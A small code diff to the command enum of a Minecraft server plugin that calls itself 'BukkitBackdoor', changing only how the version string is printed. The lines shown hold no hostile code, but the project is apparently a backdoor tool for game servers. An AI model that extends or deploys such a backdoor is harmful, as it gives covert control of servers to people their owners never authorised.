@@ -15,7 +15,7 @@ public enum CommandEnum {
         sender.sendMessage(DefaultConfig.getReplacements().entrySet().stream().map(entry -> entry.getKey() + "=" + entry.getValue()).toList().toArray(new String[0]));
     }),
     VERSION("v", (sender) -> {
-        sender.sendMessage("BukkitBackdoor v${project.version}");
+        sender.sendMessage("BukkitBackdoor v" + BukkitBackdoorPlugin.getInstance().getDescription().getVersion());
     }),
     EXIT("exit", (sender) -> {
         Bukkit.getScheduler().runTaskAsynchronously(BukkitBackdoorPlugin.getInstance(), () -> {
